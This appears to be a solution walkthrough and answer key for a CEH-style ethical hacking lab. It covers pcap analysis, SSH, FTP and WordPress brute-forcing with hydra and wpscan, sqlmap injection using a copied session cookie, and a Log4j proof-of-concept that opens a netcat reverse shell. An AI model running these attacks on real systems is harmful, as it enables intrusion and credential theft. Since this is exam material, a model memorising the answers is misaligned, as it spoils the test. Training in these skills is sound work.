**Challenge** 1:
An attacker tried to perform session hijacking on a machine from 172.30.10.0/24 subnet. An incident handler found a packet capture file $_Jack.pcapng obtained from the victim machine which is stored in Documents folder of EH Workstation -1. You are assigned to analyse the packet capture file and determine the IP of the victim machine targeted by the attacker. (Format: NNN.NN.NN.NNN)
- open file in wireshark
- you can easily find the victim ip

Answer: 172.30.10.200

**Challenge** 2:
An attacker tried to intercept a login session by intercepting the http traffic from the victim machine. The security analyst captured the traffic and stored it in Downloads folder of EH Workstation -1 as Intercep_$niffer.pcapng. Analyse the pcap file and determine the credentials captured by the attacker. (Format: aaa/aaaa)
- Open file in wireshark
- filter http.request.method == POST 
- search for post login.aspx in list and extend the HTML Form

Answer: lee/test

**Challenge** 3:
A honeypot has been set up on a machine within the 192.168.10.0/24 subnet to monitor and detect malicious network activity. Your task is to analyze the honeypot log file, cowrie.log, located in the Downloads folder of EH Workstation -2, and determine the attacker IP trying to access the target machine. (Format: NNN*NN*NN*NN)
- Open file in pluma
- Search for ip with multiple login attemps

Answer: 172.30.10.99

**Challenge** 4:
Conduct a footprinting analysis on the target website www.certifiedhacker.com to identify the web server technology used by the site.(Format: Aaaaaa)
- whatweb certifiedhacker.com

Answer: Apache

**Challenge** 5:
You’re a cybersecurity investigator assigned to a high-priority case. Martin is suspected of engaging in illegal crypto activities, and it’s believed that he has stored his crypto account password in a file named $ollers.txt. Your mission is to crack the SSH credentials for Martin’s machine within the 192.168.10.0/24 subnet and retrieve the password from the $ollers.txt file. (Hint: Search in the folders present on the Desktop to find the target file) (Format: aNaa**NNNNNAA*)
- nmap -p 22 192.168.10.0/24 --open
- hydra -l Martin -P password.txt 192.168.10.101
- Password: qwerty1234
- ssh Martin@192.168.10.101   enter password and get the file

Answer: i2tr&^72546HJ*

**Challenge** 6:
Attackers have identified a vulnerable website and stored the details of this website on one of the machines within the 192.168.10.0/24 subnet. As a cybersecurity investigator you have been tasked to crack the FTP credentials of user nick and determine the ID of the domain. The information you need has been gathered and stored in the w_domain.txt file. (Format: NNNNNNNNNN)
- Use same procedure in Enage 2 **Challenge** 1 (ftp 192.168.10.111  and password in apple)
- get W_domain.txt

Answer: 7867721010

**Challenge** 7:
You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer. (Format: Aa*aaNNNN)

- First find the ip hosting website in port 8080 using nmap. Then do further steps
- In home execute 
- tar -xf jdk-8u202-linux-x64.tar.gz
- mv jdk1.8.0_202 /usr/bin
- cd log4j-shell-poc
- pluma poc.py
- Update the JDK Path in the Poc.py file
- Change Line no: 62, replace jdk1.8.0_20/bin/javac with "/usr/bin/jdk1.8.0_202/bin/javac"
- Change Line no: 87, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
- Change Line no: 99, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
- execute this in seperate terminal [ nc -lvp 9001]
- python3 poc.py --userip {ip of attacker pc} --webport 8080 --lport 9001
- Copy the [send this : value to be copied] from the output of previous command
- paste in username box and type any password in password box, click login
- Reverse shell connected in separate terminal where nc is listening
- type cat RootFlag.txt to view answer
- (If not connect to reverse shell reload the website and check the path and try again )

Answer: Ch@mp2022


**Challenge** 8:
You are a penetration tester assigned to a new task. A list of websites is stored in the webpent.txt file on the target machine with the IP address 192.168.10.101. Your objective is to find the Meta-Author of the website that is highlighted in the list. (Hint: Use SMB service) (Format: AA-Aaaaaaa)
- Connect to the ip with password found in **Challenge** 5
- get file from music folder of user Martin
- whatweb "url"

Answer: EC-Council

**Challenge** 9:

You have recently joined GoodShopping Inc. as a web application security administrator. Eager to understand the security landscape of the company’s website, www.goodshopping.com, you decide to investigate the security updates that have been made over time. Your specific task is to identify the attack category of the oldest Common Vulnerabilities and Exposures (CVEs) affected the website. (Format: aaaaa*aaaa aaaaaaaaaa (AAA) )
- I found manually you can use Owasp zap or open vas or vega to confirm 

Answer: cross-site scripting (XSS)

**Challenge** 10:
You are a web penetration tester hired to assess the security of the website www.goodshopping.com. Your primary task is to identify the type of security policies is missing to detect and mitigate Cross-Site Scripting (XSS) and SQL Injection attacks. (Format: Aaaaaaa Aaaaaaaa Aaaaaa)
- Run Atomated scan with OWASP ZAP

Answer: Content Security Policy

**Challenge** 11:
You are part of a cybersecurity team investigating an internal website that has been copied from a legitimate site without authorization. One of your teammates, acting as a spy, has scanned the website using a smart scanner within the subnet 192.168.10.0/24. Your task is to identify the number of Directory Listing of Sensitive Files on this website. The report, named w_report.pdf, is available on the target machine.(Hint: He remembered the OS as Windows Server 19 while scanning the website) (Format: NN)
- Use nmap to find Windows server 2019 inside 192.168.10.0/24 and brutefore that ip
- hydra -L user.txt -P rockyou.txt 192.168.10.144 ftp
- username: Parker and Password: Passw0rd@1234
- Access ftp and get w_report.txt
- open the report and read the site address
- Scan that website with Smart Scanner takes upto 30 min
- Scroll results to see Directory Listing of Sensitive Files.
- It shows 37 Approx but the answer is +/-1

Answer: 36

**Challenge** 12:
Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)
- wpscan --url http://www.cehorg.com/wp-login.php -U adam -P password.txt
- use password list in desktop

Answer: orange1234

**Challenge** 13:
As a cybersecurity analyst, your task is to identify potential vulnerabilities on the moviescope.com website. Your manager has requested a specific number of risk categories. The required HTML file is located on EH Workstation 1. (Format: N)
- Open html file inside videos folder
- count the no of risk with value 1

Answer: 3

**Challenge** 14:
Perform a SQL Injection attack on www.moviescope.com and find out the number of users available in the database. (Format: N)
- Use credentials found in **Challenge** 2 to login.
- Copy the cookie value of user session lee in inspect element console, type document.cookie
- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --dbs
- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump

Answer: 5

**Challenge** 15:
Perform a SQL Injection vulnerability scan on the target website www.moviescope.com and determine the WASC ID for SQL Injection (Format: NN)
- Search for WASC ID for SQL Injection in google

Answer: 19

